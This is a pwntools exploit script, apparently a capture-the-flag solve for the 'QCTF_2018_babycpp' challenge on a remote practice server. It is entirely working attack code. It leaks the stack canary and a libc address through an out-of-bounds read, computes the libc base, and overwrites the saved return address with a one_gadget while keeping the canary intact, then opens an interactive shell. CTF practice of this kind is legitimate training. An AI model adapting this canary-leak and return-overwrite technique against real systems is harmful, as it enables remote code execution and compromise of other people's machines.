from pwn import *
r = remote('node3.buuoj.cn',25366)
#r = process('./QCTF_2018_babycpp')
elf = ELF('./QCTF_2018_babycpp')
libc = ELF('/libc-2.27.so')

def change(num):
	r.recvuntil('> ')
	r.sendline('1')
	r.sendline(str(num))

def get(array):
	r.recvuntil('> ')
	r.sendline('2')
	r.recvuntil('num:')
	r.sendline(array)

def unique():
	r.recvuntil('> ')
	r.sendline('3')

def get_data(l,h):
	if l < 0:
		l = 0x100000000 + l
	if h < 0:
		h = 0x100000000 + h
	data = h*0x100000000 + l
	return data

r.recvuntil('input n:')
r.sendline('22')#22*4=88
get('1 '*22)
change(28)
unique()
r.recvuntil('1 ')
canary_l = int(r.recvuntil(' '))
canary_h = int(r.recvuntil(' '))
canary = get_data(canary_l,canary_h)
log.success(hex(canary))

leak_l = int(r.recvuntil(' '))
leak_h = int(r.recvuntil(' '))
leak = get_data(leak_l,leak_h)
log.success(hex(leak))

leak_l = int(r.recvuntil(' '))
leak_h = int(r.recvuntil(' '))
leak = get_data(leak_l,leak_h)
log.success(hex(leak))
libc_base = leak-231-libc.sym['__libc_start_main']
log.success(hex(libc_base))
one = libc_base+0x4f322
one_l = one%0x100000000
if one_l > 0x7fffffff:
	one_l = 0x100000000-one_l
one_h = one>>32
log.info(str(one_l))
log.info(str(one_h))
get('1 '*22+str(canary_l)+' '+str(canary_h)+' '+'1 1 '+str(one_l)+' '+str(one_h))
r.sendline('4')
r.interactive()